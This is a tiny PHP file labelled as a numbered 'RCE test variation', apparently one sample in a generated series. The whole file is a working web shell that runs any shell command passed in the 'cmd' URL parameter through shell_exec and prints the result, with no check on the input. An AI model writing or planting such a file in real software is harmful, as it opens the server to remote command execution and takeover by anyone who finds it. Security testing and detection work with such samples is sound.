<?php
// RCE test variation #1226
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>